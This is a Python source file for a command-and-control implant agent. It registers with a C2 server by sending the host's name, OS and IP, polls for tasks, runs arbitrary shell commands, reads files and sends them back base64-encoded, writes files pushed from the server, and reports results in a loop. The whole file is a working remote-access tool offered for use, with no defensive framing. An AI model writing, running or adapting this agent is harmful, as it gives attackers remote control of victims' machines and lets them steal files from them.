"""
Agent Handler - Manages C2 agent connections and tasks
"""

import asyncio
import httpx
from typing import Dict, List, Optional
from datetime import datetime
import logging

logger = logging.getLogger(__name__)


class AgentHandler:
    """
    Handles agent communication and task management
    
    Features:
    - Agent registration
    - Task assignment
    - Result collection
    - Health monitoring
    - Automatic reconnection
    """
    
    def __init__(self, c2_url: str, agent_id: Optional[str] = None):
        self.c2_url = c2_url
        self.agent_id = agent_id
        self.encryption_key = None
        self.running = False
        
        # Agent info
        import platform
        import socket
        
        self.agent_info = {
            "hostname": platform.node(),
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "ip": socket.gethostbyname(socket.gethostname())
        }
    
    async def register(self) -> bool:
        """Register agent with C2 server"""
        
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.post(
                    f"{self.c2_url}/register",
                    json=self.agent_info
                )
                
                if response.status_code == 200:
                    data = response.json()
                    self.agent_id = data["agent_id"]
                    self.encryption_key = data["key"]
                    
                    logger.info(f"[AgentHandler] Registered with C2: {self.agent_id}")
                    return True
                else:
                    logger.error(f"[AgentHandler] Registration failed: {response.status_code}")
                    return False
        
        except Exception as e:
            logger.error(f"[AgentHandler] Registration error: {e}")
            return False
    
    async def beacon(self) -> Optional[Dict]:
        """Send beacon to C2 and get pending task"""
        
        if not self.agent_id:
            logger.error("[AgentHandler] Not registered")
            return None
        
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.get(
                    f"{self.c2_url}/beacon/{self.agent_id}"
                )
                
                if response.status_code == 200:
                    data = response.json()
                    task = data.get("task")
                    
                    if task:
                        logger.info(f"[AgentHandler] Received task: {task['command']}")
                    
                    return task
                else:
                    logger.error(f"[AgentHandler] Beacon failed: {response.status_code}")
                    return None
        
        except Exception as e:
            logger.error(f"[AgentHandler] Beacon error: {e}")
            return None
    
    async def submit_result(self, task_id: str, success: bool, data: Dict) -> bool:
        """Submit task result to C2"""
        
        if not self.agent_id:
            logger.error("[AgentHandler] Not registered")
            return False
        
        try:
            async with httpx.AsyncClient(timeout=30.0) as client:
                response = await client.post(
                    f"{self.c2_url}/result/{self.agent_id}",
                    json={
                        "task_id": task_id,
                        "success": success,
                        "data": data
                    }
                )
                
                if response.status_code == 200:
                    logger.info(f"[AgentHandler] Result submitted for task {task_id}")
                    return True
                else:
                    logger.error(f"[AgentHandler] Result submission failed: {response.status_code}")
                    return False
        
        except Exception as e:
            logger.error(f"[AgentHandler] Result submission error: {e}")
            return False
    
    async def execute_task(self, task: Dict) -> Dict:
        """Execute received task"""
        
        command = task.get("command")
        args = task.get("args", {})
        
        logger.info(f"[AgentHandler] Executing task: {command}")
        
        try:
            if command == "shell":
                # Execute shell command
                import subprocess
                cmd = args.get("cmd")
                
                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                
                return {
                    "success": True,
                    "stdout": result.stdout,
                    "stderr": result.stderr,
                    "returncode": result.returncode
                }
            
            elif command == "download":
                # Download file from target
                filepath = args.get("filepath")
                
                with open(filepath, 'rb') as f:
                    import base64
                    content = base64.b64encode(f.read()).decode()
                
                return {
                    "success": True,
                    "content": content,
                    "filepath": filepath
                }
            
            elif command == "upload":
                # Upload file to target
                filepath = args.get("filepath")
                content = args.get("content")
                
                import base64
                with open(filepath, 'wb') as f:
                    f.write(base64.b64decode(content))
                
                return {
                    "success": True,
                    "message": f"File uploaded to {filepath}"
                }
            
            elif command == "sysinfo":
                # Get system information
                import platform
                import psutil
                
                return {
                    "success": True,
                    "hostname": platform.node(),
                    "os": platform.system(),
                    "version": platform.version(),
                    "architecture": platform.machine(),
                    "cpu_count": psutil.cpu_count(),
                    "memory_total": psutil.virtual_memory().total,
                    "disk_usage": psutil.disk_usage('/').percent
                }
            
            elif command == "sleep":
                # Change beacon interval
                interval = args.get("interval", 60)
                return {
                    "success": True,
                    "message": f"Beacon interval set to {interval}s"
                }
            
            else:
                return {
                    "success": False,
                    "error": f"Unknown command: {command}"
                }
        
        except Exception as e:
            logger.error(f"[AgentHandler] Task execution error: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def run(self, beacon_interval: int = 60):
        """Main agent loop"""
        
        # Register if not already registered
        if not self.agent_id:
            registered = await self.register()
            if not registered:
                logger.error("[AgentHandler] Failed to register, exiting")
                return
        
        self.running = True
        logger.info(f"[AgentHandler] Starting main loop (interval: {beacon_interval}s)")
        
        while self.running:
            try:
                # Send beacon and get task
                task = await self.beacon()
                
                if task:
                    # Execute task
                    result = await self.execute_task(task)
                    
                    # Submit result
                    await self.submit_result(
                        task["task_id"],
                        result.get("success", False),
                        result
                    )
                
                # Sleep until next beacon
                await asyncio.sleep(beacon_interval)
            
            except Exception as e:
                logger.error(f"[AgentHandler] Main loop error: {e}")
                await asyncio.sleep(beacon_interval)
    
    def stop(self):
        """Stop agent"""
        logger.info("[AgentHandler] Stopping agent")
        self.running = False


# Standalone execution
if __name__ == "__main__":
    import sys
    
    async def main():
        c2_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
        
        handler = AgentHandler(c2_url)
        await handler.run(beacon_interval=30)
    
    asyncio.run(main())

